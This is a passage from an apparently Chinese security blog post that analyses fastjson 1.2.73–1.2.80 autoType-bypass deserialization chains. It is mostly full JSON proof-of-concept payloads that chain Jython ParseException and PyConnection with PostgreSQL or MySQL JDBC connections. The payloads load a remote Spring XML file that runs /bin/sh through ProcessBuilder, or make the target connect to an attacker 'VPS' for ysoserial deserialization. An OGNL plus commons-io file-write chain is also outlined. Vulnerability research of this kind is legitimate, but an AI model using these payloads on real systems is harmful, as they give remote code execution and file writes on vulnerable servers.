class="name">groupId</span>&gt;</span>org.python<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jython<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.postgresql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>postgresql<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>42.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.22.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3-3-1-ParseException"><a href="#3-3-1-ParseException" class="headerlink" title="3.3.1 ParseException"></a>3.3.1 ParseException</h4><p>和groovy类似，<code>org.python.antlr.ParseException</code>中<code>setType</code>方法中参数是<code>org.python.core.PyObject</code>类型，在完成一次<code>JSONObject</code>的反序列化后，内存中的<code>ParseConfig.deserializers</code>变量会加入<code>PyObject</code>类，后面的利用中，<code>org.python.core.PyObject</code>类可以绕过<code>autoType</code></p><ul><li><code>ParseException</code>的继承/接口实现关系</li></ul><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/21.png" alt="21" style="zoom:50%;" /></div><h5 id="3-3-1-1-ParseException-setType方法"><a href="#3-3-1-1-ParseException-setType方法" class="headerlink" title="3.3.1.1 ParseException#setType方法"></a>3.3.1.1 ParseException#setType方法</h5><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/22.png" alt="22" style="zoom:50%;" /></div><h4 id="3-3-2-com-ziclix-python-sql-PyConnection"><a href="#3-3-2-com-ziclix-python-sql-PyConnection" class="headerlink" title="3.3.2 com.ziclix.python.sql.PyConnection"></a>3.3.2 com.ziclix.python.sql.PyConnection</h4><p>现在可以使用<code>org.python.core.PyObject</code>类</p><ul><li><code>com.ziclix.python.sql.PyConnection</code>类继承<code>PyObject</code></li><li>在<code>PyConnection</code>默认构造方法中，参数是<code>java.sql.Connection</code>类型</li><li>结合1.2.68中<code>pgsql</code>的利用链，使用<code>org.postgresql.jdbc.PgConnection</code>和<code>ClassPathXmlApplicationContext</code>远程加载<code>xml</code>文件</li></ul><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/23.png" alt="23" style="zoom:50%;" /></div><h4 id="3-3-3-Poc根据上面的思路，拼接Poc"><a href="#3-3-3-Poc根据上面的思路，拼接Poc" class="headerlink" title="3.3.3 Poc根据上面的思路，拼接Poc"></a>3.3.3 Poc根据上面的思路，拼接Poc</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;x&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.python.antlr.ParseException&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>:&#123;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;y&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.python.core.PyObject&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.ziclix.python.sql.PyConnection&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;connection&quot;</span>: &#123;</span><br><span class="line">          <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.postgresql.jdbc.PgConnection&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;hostSpecs&quot;</span>: [</span><br><span class="line">              &#123;</span><br><span class="line">                  <span class="attr">&quot;host&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">                  <span class="attr">&quot;port&quot;</span>: <span class="number">0</span></span><br><span class="line">              &#125;</span><br><span class="line">          ],</span><br><span class="line">          <span class="attr">&quot;user&quot;</span>: <span class="string">&quot;pgsql&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;database&quot;</span>: <span class="string">&quot;pgsql&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;info&quot;</span>: &#123;</span><br><span class="line">              <span class="attr">&quot;socketFactory&quot;</span>: <span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>,</span><br><span class="line">              <span class="attr">&quot;socketFactoryArg&quot;</span>: <span class="string">&quot;http://127.0.0.1:8889/1.xml&quot;</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;work&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>/bin/sh<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>open /System/Applications/Calculator.app<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;do&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123;work.start()&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>但是当我使用上面的poc时，fastjson在1.2.76以下就能用了，会在org.python.antlr.ParseException#setType传入参数时报错，因此这里有个兼容的poc，分析在最后面的 4.1 中</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;a&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.python.antlr.ParseException&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;b&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;val&quot;</span>: &#123;</span><br><span class="line">          <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.String&quot;</span>&#123;</span><br><span class="line">              <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.util.Locale&quot;</span>,</span><br><span class="line">              <span class="attr">&quot;val&quot;</span>: &#123;</span><br><span class="line">                  <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class="line">                  &#123;</span><br><span class="line">                      &quot;@type&quot;: &quot;java.lang.String&quot;&quot;@type&quot;: &quot;org.python.antlr.ParseException&quot;,</span><br><span class="line">                      &quot;type&quot;: &#123;&#125;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;c&quot;: &#123;</span><br><span class="line">              &quot;@type&quot;: &quot;org.python.core.PyObject&quot;,</span><br><span class="line">              &quot;@type&quot;: &quot;com.ziclix.python.sql.PyConnection&quot;,</span><br><span class="line">              &quot;connection&quot;: &#123;</span><br><span class="line">                  &quot;@type&quot;: &quot;org.postgresql.jdbc.PgConnection&quot;,</span><br><span class="line">                  &quot;hostSpecs&quot;: [</span><br><span class="line">                      &#123;</span><br><span class="line">                          <span class="attr">&quot;host&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">                          <span class="attr">&quot;port&quot;</span>: <span class="number">0</span></span><br><span class="line">                      &#125;</span><br><span class="line">                  ],</span><br><span class="line">                  &quot;user&quot;: &quot;user&quot;,</span><br><span class="line">                  &quot;database&quot;: &quot;test&quot;,</span><br><span class="line">                  &quot;info&quot;: &#123;</span><br><span class="line">                      &quot;socketFactory&quot;: &quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;,</span><br><span class="line">                      &quot;socketFactoryArg&quot;: &quot;http://127.0.0.1:8889/bean.xml&quot;</span><br><span class="line">                  &#125;,</span><br><span class="line">                  &quot;url&quot;: &quot;&quot;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/24.png" alt="24" style="zoom:50%;" /></div><h3 id="3-4-JPython-mysql-Connection利用链"><a href="#3-4-JPython-mysql-Connection利用链" class="headerlink" title="3.4 JPython + mysql Connection利用链"></a>3.4 JPython + mysql Connection利用链</h3><p><strong>适用版本：&lt;=1.2.80</strong><br>依赖类：</p><ul><li><code>org.python.antlr.ParseException</code></li><li><code>com.ziclix.python.sql.PyConnection</code></li><li>mysql-Connection版本5.1.11 - 5.1.49： <code>com.mysql.jdbc.JDBC4Connection</code></li><li>mysql-Connection版本6.0.2、6.0.3：<code>com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection</code></li><li>mysql-Connection版本8.0.19：<code>com.mysql.cj.jdbc.ha.ReplicationMySQLConnection</code>、<code>com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy</code>、<code>com.mysql.cj.conf.url.ReplicationConnectionUrl</code></li></ul><p>实现原理和<code>JPython + pgsql</code>一样；关于mysql利用链的分析，参考1.2.68漏洞分析；</p><h4 id="3-4-1-mysql-Connection-5-1-11-5-1-49反序列化"><a href="#3-4-1-mysql-Connection-5-1-11-5-1-49反序列化" class="headerlink" title="3.4.1 mysql Connection 5.1.11-5.1.49反序列化"></a>3.4.1 mysql Connection 5.1.11-5.1.49反序列化</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;x&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.python.antlr.ParseException&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;y&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;val&quot;</span>: &#123;</span><br><span class="line">          <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.String&quot;</span>&#123;</span><br><span class="line">              <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.util.Locale&quot;</span>,</span><br><span class="line">              <span class="attr">&quot;val&quot;</span>: &#123;</span><br><span class="line">                  <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class="line">                  &#123;</span><br><span class="line">                      &quot;@type&quot;: &quot;java.lang.String&quot;&quot;@type&quot;: &quot;org.python.antlr.ParseException&quot;,</span><br><span class="line">                      &quot;type&quot;: &#123;&#125;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;c&quot;: &#123;</span><br><span class="line">            &quot;@type&quot;: &quot;org.python.core.PyObject&quot;,</span><br><span class="line">            &quot;@type&quot;: &quot;com.ziclix.python.sql.PyConnection&quot;,</span><br><span class="line">            &quot;connection&quot;: &#123;</span><br><span class="line">              &quot;@type&quot;: &quot;com.mysql.jdbc.JDBC4Connection&quot;,</span><br><span class="line">              &quot;hostToConnectTo&quot;: &quot;VPS&quot;,</span><br><span class="line">              &quot;portToConnectTo&quot;: 3306,</span><br><span class="line">              &quot;info&quot;: &#123;</span><br><span class="line">                &quot;user&quot;: &quot;yso_CommonsBeanutils1_open /System/Applications/Calculator.app&quot;,</span><br><span class="line">                &quot;password&quot;: &quot;none&quot;,</span><br><span class="line">                &quot;statementInterceptors&quot;: &quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,</span><br><span class="line">                &quot;autoDeserialize&quot;: &quot;true&quot;,</span><br><span class="line">                &quot;NUM_HOSTS&quot;: &quot;1&quot;</span><br><span class="line">              &#125;,</span><br><span class="line">              &quot;databaseToConnectTo&quot;: &quot;name&quot;,</span><br><span class="line">              &quot;url&quot;: &quot;&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/25.png" alt="25" style="zoom:50%;" /></div><p>也可以结合tomcat回显</p><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/26.png" alt="26" style="zoom:50%;" /></div><h4 id="3-4-2-mysql-Connection-6-0-2-6-0-3"><a href="#3-4-2-mysql-Connection-6-0-2-6-0-3" class="headerlink" title="3.4.2 mysql Connection 6.0.2/6.0.3"></a>3.4.2 mysql Connection 6.0.2/6.0.3</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;x&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.python.antlr.ParseException&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;y&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;val&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.String&quot;</span>&#123;</span><br><span class="line">                <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.util.Locale&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;val&quot;</span>: &#123;</span><br><span class="line">                    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;@type&quot;: &quot;java.lang.String&quot;&quot;@type&quot;: &quot;org.python.antlr.ParseException&quot;,</span><br><span class="line">                        &quot;type&quot;: &#123;&#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;c&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;org.python.core.PyObject&quot;,</span><br><span class="line">                &quot;@type&quot;: &quot;com.ziclix.python.sql.PyConnection&quot;,</span><br><span class="line">                &quot;connection&quot;: &#123;</span><br><span class="line">                  &quot;@type&quot;:&quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;,</span><br><span class="line">                  &quot;proxy&quot;: &#123;</span><br><span class="line">                         &quot;connectionString&quot;:&#123;</span><br><span class="line">                                &quot;url&quot;:&quot;jdbc:mysql://VPS:3306/name?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsBeanutils1_open /System/Applications/Calculator.app&quot;</span><br><span class="line">                         &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h4 id="3-4-3-mysql-Connection-8-0-19"><a href="#3-4-3-mysql-Connection-8-0-19" class="headerlink" title="3.4.3 mysql Connection 8.0.19"></a>3.4.3 mysql Connection 8.0.19</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;x&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.python.antlr.ParseException&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;y&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;val&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.String&quot;</span>&#123;</span><br><span class="line">                <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.util.Locale&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;val&quot;</span>: &#123;</span><br><span class="line">                    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;@type&quot;: &quot;java.lang.String&quot;&quot;@type&quot;: &quot;org.python.antlr.ParseException&quot;,</span><br><span class="line">                        &quot;type&quot;: &#123;&#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;c&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;org.python.core.PyObject&quot;,</span><br><span class="line">                &quot;@type&quot;: &quot;com.ziclix.python.sql.PyConnection&quot;,</span><br><span class="line">                &quot;connection&quot;: &#123;</span><br><span class="line">                  &quot;@type&quot;: &quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;,</span><br><span class="line">                  &quot;proxy&quot;: &#123;</span><br><span class="line">                    &quot;@type&quot;: &quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;,</span><br><span class="line">                    &quot;connectionUrl&quot;: &#123;</span><br><span class="line">                      &quot;@type&quot;: &quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;,</span><br><span class="line">                      &quot;masters&quot;: [</span><br><span class="line">                        &#123;</span><br><span class="line">                          <span class="attr">&quot;host&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                      ],</span><br><span class="line">                      &quot;slaves&quot;: [],</span><br><span class="line">                      &quot;properties&quot;: &#123;</span><br><span class="line">                        &quot;host&quot;: &quot;VPS&quot;,</span><br><span class="line">                        &quot;port&quot;: 3306,</span><br><span class="line">                        &quot;user&quot;: &quot;yso_CommonsBeanutils1_open /System/Applications/Calculator.app&quot;,</span><br><span class="line">                        &quot;dbname&quot;: &quot;root&quot;,</span><br><span class="line">                        &quot;password&quot;: &quot;root&quot;,</span><br><span class="line">                        &quot;queryInterceptors&quot;: &quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,</span><br><span class="line">                        &quot;autoDeserialize&quot;: &quot;true&quot;</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/27.png" alt="27" style="zoom:50%;" /></div><h3 id="3-5-OGNL-Commons-io"><a href="#3-5-OGNL-Commons-io" class="headerlink" title="3.5 OGNL + Commons-io"></a>3.5 OGNL + Commons-io</h3><p><strong>适用版本：1.2.73~1.2.80</strong></p><h4 id="3-5-1-写文件"><a href="#3-5-1-写文件" class="headerlink" title="3.5.1 写文件"></a>3.5.1 写文件</h4><p>和3.2、3.3的思路类似，通过<code>ognl.OgnlException</code>为入口点，其中的setXXX方法的参数类型为ognl.Evaluation类型，一层一层的将构造方法中参数类型的类加入到缓存中，绕过autoTypeSupport，最终在OgnlParser的构造方法参数类型为InputStream，结合1.2.68中commons-io的利用链，写入或读取文件</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ognl.OgnlException 继承 java.lang.Exception</span><br><span class="line">- ognl.OgnlException中setEvaluation方法的参数是ognl.Evaluation类型</span><br><span class="line">  - ognl.Evaluation的构造方法中，参数node的类型是ognl.SimpleNode；ognl.ASTMethod是ognl.SimpleNode的子类</span><br><span class="line">    - ognl.ASTMethod的构造方法中，参数p的类型是ognl.OgnlParser</span><br><span class="line">      - ognl.OgnlParser的构造方法中，参数stream的类型是InputStream类型</span><br></pre></td></tr></table></figure><h5 id="3-5-1-1-WriteOutputStream的构造方法"><a href="#3-5-1-1-WriteOutputStream的构造方法" class="headerlink" title="3.5.1.1 WriteOutputStream的构造方法"></a>3.5.1.1 WriteOutputStream的构造方法</h5><p>运行poc，这里又出现了1.2.68分析<code>commons-io</code>写入利用链时一样的问题，<code>WriterOutputStream</code>使用了带有<code>Charset</code>的构造方法；导致反序列化失败，文件内容无法写入~</p><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/28.png" alt="28" style="zoom:50%;" /></div><p>后来在windows上，是正常的，如图，windows平台clazz.getDeclaredConstructors获取的constructors数组中，构造方法<code>public org.apache.commons.io.output.WriterOutputStream(java.io.Writer,java.lang.String,int,boolean)</code>在数组的前面，因此不会出现charset；</p><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/29.png" alt="29" style="zoom:50%;" /></div><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/30.png" alt="30" style="zoom:50%;" /></div><h5 id="3-5-1-2-Poc"><a href="#3-5-1-2-Poc" class="headerlink" title="3.5.1.2 Poc"></a>3.5.1.2 Poc</h5><p><code>WriterOutputStream</code>中共有三个参数为4个数量的构造方法，在mac平台上，不稳定的使用了其中一个，构造方法第二个参数的类型分别是String、Charset、CharsetDecoder，其中</p><ul><li><p>String类型的参数可以直接构造</p></li><li><p>CharsetDecoder类型的参数，可以使用<code>com.alibaba.fastjson.util.UTF8Decoder</code>来构造</p></li><li><p>Charset类型的参数，fastjson内置使用<code>MiscCodec</code>工具类来解析，自动调用<code>Charset.forName(strVal)</code>获取<code>Charset</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public org.apache.commons.io.output.WriterOutputStream(java.io.Writer,java.lang.String,int,boolean)</span><br><span class="line">public org.apache.commons.io.output.WriterOutputStream(java.io.Writer,java.nio.charset.CharsetDecoder,int,boolean)</span><br><span class="line">public org.apache.commons.io.output.WriterOutputStream(java.io.Writer,java.nio.charset.Charset,int,boolean)</span><br></pre></td></tr></table></figure><p>因此这里有三个Poc，大家可以<code>fuzz</code>，不过大部分情况下遇到的都是直接构造String类型的<code>charsetName</code>即可</p></li><li><p><code>WriterOutputStream</code>使用包含<code>charsetName</code>的构造方法</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 